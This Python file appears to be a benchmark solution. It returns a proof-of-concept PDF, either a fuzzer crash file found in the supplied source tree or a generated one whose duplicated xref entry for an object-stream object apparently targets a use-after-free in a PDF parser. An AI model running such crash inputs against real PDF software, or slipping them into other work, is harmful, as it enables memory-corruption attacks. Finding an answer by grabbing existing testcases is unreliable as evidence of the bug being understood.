import os
import io
import tarfile
import zlib
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._find_embedded_pdf_poc(src_path)
        if data is not None:
            return data
        return self._generate_pdf()

    def _find_embedded_pdf_poc(self, src_path: str) -> Optional[bytes]:
        def looks_like_poc_name(name: str) -> bool:
            n = name.lower()
            if any(k in n for k in ("clusterfuzz", "testcase", "oss-fuzz", "poc", "crash", "repro", "uaf")):
                return True
            if n.endswith(".pdf"):
                return True
            return False

        best: Optional[bytes] = None

        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    members = tf.getmembers()
                    members.sort(key=lambda m: m.size if m.isfile() else 1 << 60)
                    checked = 0
                    for m in members:
                        if checked >= 2000:
                            break
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 5_000_000:
                            continue
                        name = m.name or ""
                        if not looks_like_poc_name(name):
                            continue
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        try:
                            head = f.read(8)
                            if not head.startswith(b"%PDF-"):
                                continue
                            rest = f.read()
                            data = head + rest
                            if best is None or len(data) < len(best):
                                best = data
                        finally:
                            try:
                                f.close()
                            except Exception:
                                pass
                        checked += 1
            elif os.path.isdir(src_path):
                checked = 0
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if checked >= 2000:
                            break
                        path = os.path.join(root, fn)
                        low = fn.lower()
                        if not (low.endswith(".pdf") or any(k in low for k in ("clusterfuzz", "testcase", "oss-fuzz", "poc", "crash", "repro", "uaf"))):
                            continue
                        try:
                            st = os.stat(path)
                            if st.st_size <= 0 or st.st_size > 5_000_000:
                                continue
                            with open(path, "rb") as f:
                                head = f.read(8)
                                if not head.startswith(b"%PDF-"):
                                    continue
                                data = head + f.read()
                            if best is None or len(data) < len(best):
                                best = data
                            checked += 1
                        except Exception:
                            pass
                    if checked >= 2000:
                        break
        except Exception:
            return None

        return best

    def _pdf_obj(self, objnum: int, body: bytes) -> bytes:
        return (f"{objnum} 0 obj\n").encode("ascii") + body + b"\nendobj\n"

    def _pdf_stream_obj(self, objnum: int, dict_bytes: bytes, stream_data: bytes) -> bytes:
        return (
            (f"{objnum} 0 obj\n").encode("ascii")
            + dict_bytes
            + b"\nstream\n"
            + stream_data
            + b"\nendstream\nendobj\n"
        )

    def _build_objstm(self, objnum: int, contained_objnum: int, contained_obj: bytes) -> bytes:
        header = (f"{contained_objnum} 0 ").encode("ascii")
        first = len(header)
        raw = header + contained_obj
        comp = zlib.compress(raw)
        d = (
            f"<< /Type /ObjStm /N 1 /First {first} /Length {len(comp)} /Filter /FlateDecode >>"
        ).encode("ascii")
        return self._pdf_stream_obj(objnum, d, comp)

    def _encode_xref_entry(self, t: int, f2: int, f3: int, w: Tuple[int, int, int]) -> bytes:
        w1, w2, w3 = w
        return (
            int(t).to_bytes(w1, "big", signed=False)
            + int(f2).to_bytes(w2, "big", signed=False)
            + int(f3).to_bytes(w3, "big", signed=False)
        )

    def _build_xref_stream(
        self,
        objnum: int,
        size: int,
        offsets: Dict[int, int],
        root_obj: int,
        prev: Optional[int],
        index: Optional[List[Tuple[int, int]]],
        obj5_entry: Tuple[int, int, int],
        w: Tuple[int, int, int] = (1, 4, 2),
    ) -> bytes:
        free0 = (0, 0, (1 << (8 * w[2])) - 1)

        def entry_for_obj(n: int) -> Tuple[int, int, int]:
            if n == 0:
                return free0
            if n == 5:
                return obj5_entry
            off = offsets.get(n)
            if off is None:
                return free0
            return (1, off, 0)

        if index is None:
            index = [(0, size)]

        xref_data = bytearray()
        for start, count in index:
            for on in range(start, start + count):
                t, f2, f3 = entry_for_obj(on)
                xref_data += self._encode_xref_entry(t, f2, f3, w)

        parts = [
            b"<< /Type /XRef",
            (f" /Size {size}").encode("ascii"),
            (f" /W [{w[0]} {w[1]} {w[2]}]").encode("ascii"),
            (f" /Root {root_obj} 0 R").encode("ascii"),
        ]
        if prev is not None:
            parts.append((f" /Prev {prev}").encode("ascii"))
        if index != [(0, size)]:
            idx_flat = " ".join(f"{a} {b}" for a, b in index)
            parts.append((f" /Index [{idx_flat}]").encode("ascii"))
        parts.append((f" /Length {len(xref_data)}").encode("ascii"))
        parts.append(b" >>")
        d = b"".join(parts)
        return self._pdf_stream_obj(objnum, d, bytes(xref_data))

    def _generate_pdf(self) -> bytes:
        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        obj1 = self._pdf_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        obj2 = self._pdf_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        obj3 = self._pdf_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources 5 0 R /Contents 6 0 R >>",
        )

        # Revision 1: object 5 is inside object stream 4
        res_a = b"<< /ProcSet [/PDF] >>"
        obj4 = self._build_objstm(4, 5, res_a)

        content = b"q\nQ\n"
        obj6 = self._pdf_stream_obj(6, (f"<< /Length {len(content)} >>").encode("ascii"), content)

        buf = bytearray()
        buf += header
        offsets: Dict[int, int] = {}

        def add_obj(n: int, bts: bytes) -> None:
            offsets[n] = len(buf)
            buf.extend(bts)

        add_obj(1, obj1)
        add_obj(2, obj2)
        add_obj(3, obj3)
        add_obj(4, obj4)
        add_obj(6, obj6)

        # Revision 1 xref stream (7)
        offsets[7] = len(buf)
        xref1 = self._build_xref_stream(
            objnum=7,
            size=8,
            offsets={**offsets, 7: offsets[7]},
            root_obj=1,
            prev=None,
            index=None,
            obj5_entry=(2, 4, 0),
        )
        buf.extend(xref1)
        startxref1 = offsets[7]
        buf.extend(b"startxref\n")
        buf.extend(str(startxref1).encode("ascii"))
        buf.extend(b"\n%%EOF\n")

        # Revision 2: new object stream 8 containing a new version of object 5
        res_b = b"<< /ProcSet [/Text] >>"
        obj8 = self._build_objstm(8, 5, res_b)
        add_obj(8, obj8)

        # Revision 2 xref stream (9) with a duplicated Index entry for object 5
        offsets[9] = len(buf)
        index2 = [(0, 10), (5, 1)]
        xref2 = self._build_xref_stream(
            objnum=9,
            size=10,
            offsets={**offsets, 9: offsets[9]},
            root_obj=1,
            prev=startxref1,
            index=index2,
            obj5_entry=(2, 8, 0),
        )
        buf.extend(xref2)
        startxref2 = offsets[9]
        buf.extend(b"startxref\n")
        buf.extend(str(startxref2).encode("ascii"))
        buf.extend(b"\n%%EOF\n")

        return bytes(buf)